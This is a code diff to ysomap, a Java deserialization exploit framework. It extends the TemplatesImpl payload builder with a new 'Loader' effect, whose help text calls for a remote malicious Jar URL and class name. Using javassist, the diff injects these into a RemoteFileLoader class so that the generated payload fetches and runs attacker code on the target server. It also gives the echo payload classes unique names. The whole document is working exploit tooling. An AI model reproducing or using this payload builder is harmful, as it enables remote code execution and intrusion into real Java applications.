@@ -10,6 +10,7 @@ import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
 import echo.SocketEchoPayload;
 import echo.TomcatEchoPayload;
 import javassist.*;
+import loader.RemoteFileLoader;
 import ysomap.bullets.Bullet;
 import ysomap.common.annotation.*;
 import ysomap.core.util.ClassFiles;
@@ -36,10 +37,11 @@ public class TemplatesImplBullet implements Bullet<Object> {
     private Class transformerFactoryImpl;
 
     @NotNull
-    @Require(name = "type", detail = "3种方式（cmd,code,socket）:\n" +
+    @Require(name = "type", detail = "4种方式（cmd,code,socket,loader）:\n" +
                                 "1. cmd，body写入具体的系统命令；\n" +
                                 "2. code, body写入具体需要插入执行的代码；\n" +
-                                "3. socket, body写入`ip:port`\n")
+                                "3. socket, body写入`ip:port`\n" +
+                                "4. loader, body写入远程恶意Jar地址，写入格式如 `url;classname`")
     private String type = "cmd";
 
     @NotNull
@@ -47,7 +49,7 @@ public class TemplatesImplBullet implements Bullet<Object> {
     private String body = "";
 
     @NotNull
-    @Require(name = "effect", type = "string", detail="选择载入payload的效果，可选default、TomcatEcho、SocketEcho")
+    @Require(name = "effect", type = "string", detail="选择载入payload的效果，可选default、TomcatEcho、SocketEcho、Loader")
     private String effect = "default";
 
     @Require(name = "exception", type = "boolean", detail = "是否需要以抛异常的方式返回执行结果，默认为false")
@@ -66,7 +68,7 @@ public class TemplatesImplBullet implements Bullet<Object> {
             }else{
                 processedBody = PayloadHelper.makeExceptionPayload(processedBody);
             }
-        }else if("code".equals(type) || "socket".equals(type)){
+        }else if("code".equals(type) || "socket".equals(type) || "loader".equals(type)){
             // do nothing
         }
 
@@ -97,13 +99,22 @@ public class TemplatesImplBullet implements Bullet<Object> {
                     TomcatEchoPayload.class,
                     new Class<?>[]{abstractTranslet}
             );
+            cc.setName("TomcatEcho"+System.currentTimeMillis());
             ClassFiles.insertSuperClass(pool, cc, abstractTranslet);
         }else if("SocketEcho".equals(effect)){
             String[] remote = body.split(":");
             String code = "host=\""+remote[0]+"\";\nport="+remote[1]+";";
             pool.appendClassPath(new ClassClassPath(SocketEchoPayload.class));
             cc = pool.getCtClass(SocketEchoPayload.class.getName());
-            cc.setName("SocketEcho");
+            cc.setName("SocketEcho"+System.currentTimeMillis());
+            ClassFiles.insertStaticBlock(cc, code);
+            ClassFiles.insertSuperClass(pool, cc, abstractTranslet);
+        }else if("Loader".equals(effect)){
+            String[] remote = body.split(";");
+            String code = "url=\""+remote[0]+"\";\nclassname=\""+remote[1]+"\";";
+            pool.appendClassPath(new ClassClassPath(RemoteFileLoader.class));
+            cc = pool.getCtClass(RemoteFileLoader.class.getName());
+            cc.setName("Loader"+System.currentTimeMillis());
             ClassFiles.insertStaticBlock(cc, code);
             ClassFiles.insertSuperClass(pool, cc, abstractTranslet);
         }
